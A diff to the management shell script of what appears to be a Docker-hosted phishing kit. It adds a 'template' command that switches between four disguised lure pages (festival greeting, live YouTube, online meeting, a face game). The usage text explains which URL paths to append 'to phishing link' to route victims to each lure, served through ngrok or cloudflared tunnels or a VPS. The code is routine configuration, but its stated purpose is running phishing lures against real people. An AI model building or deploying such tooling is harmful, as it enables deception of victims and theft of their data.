@@ -200,13 +200,43 @@ case "${1:-up}" in
     inspect)    check_deps && inspect ;;
     rebase)     check_deps && rebase ;;
     sbom)       check_deps && sbom ;;
+    template)
+        tpl="${2:-}"
+        if [ -z "$tpl" ]; then
+            echo "Current template: ${DEFAULT_TEMPLATE:-1}"
+            echo "Usage: $0 template {1|2|3|4}"
+            echo "  1 = Festival, 2 = YouTube, 3 = Meeting, 4 = Face Runner"
+            exit 0
+        fi
+        case "$tpl" in
+            1|2|3|4)
+                sed -i '' "s/^DEFAULT_TEMPLATE=.*/DEFAULT_TEMPLATE=$tpl/" .env 2>/dev/null || \
+                sed -i "s/^DEFAULT_TEMPLATE=.*/DEFAULT_TEMPLATE=$tpl/" .env
+                echo "Template set to: $tpl"
+                echo "Restart app to apply: docker compose restart app"
+                ;;
+            *) echo "Invalid template: $tpl (use 1-4)"; exit 1 ;;
+        esac
+        ;;
     *)
-        echo "Usage: $0 {build|build-all|up|down|restart|logs|status|link|clean|inspect|rebase|sbom}"
+        echo "Usage: $0 {build|build-all|up|down|restart|logs|status|link|clean|inspect|rebase|sbom|template}"
         echo ""
         echo "Deployment modes (set DEPLOY_MODE in .env):"
         echo "  local       - Local Docker with tunnel (ngrok/cloudflared)"
         echo "  self-hosted - VPS with reverse proxy + domain"
         echo "  coolify     - Coolify-compatible deployment"
+        echo ""
+        echo "Template selection:"
+        echo "  template 1  - Festival Wishing (default)"
+        echo "  template 2  - Live YouTube TV"
+        echo "  template 3  - Online Meeting"
+        echo "  template 4  - Face Runner (game)"
+        echo ""
+        echo "URL path routing (append to phishing link):"
+        echo "  /f or /festival  → Festival"
+        echo "  /y or /youtube   → YouTube"
+        echo "  /m or /meeting   → Meeting"
+        echo "  /g or /game      → Face Runner"
         exit 1
         ;;
 esac
